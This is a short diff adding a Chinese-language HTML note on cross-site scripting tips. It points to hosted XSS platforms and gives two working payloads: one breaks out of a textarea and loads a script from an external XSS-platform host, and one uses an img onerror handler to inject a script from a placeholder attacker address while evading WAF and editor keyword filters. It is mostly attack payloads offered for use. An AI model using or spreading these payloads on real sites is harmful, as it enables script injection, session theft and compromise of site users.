@@ -1,0 +1,5 @@
+<p>1. XSS有专门的平台可以注册并使用。 例如&#160; xs.sb&#160; 域名极短。 适合注入</p>
+<p>2. 使用这个来测试：</p>
+<p>&lt;/tExtArEa&gt;&lt;sCRipt sRC=//xsshs.cn/FxAp&gt;&lt;/scRIpt&gt;</p>
+<p>3. 使用onerror事件，来规避script关键字：（例如某些WAF或者editor会拦截）</p>
+<p>&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//YOUR-IP/url.js'&gt;</p>
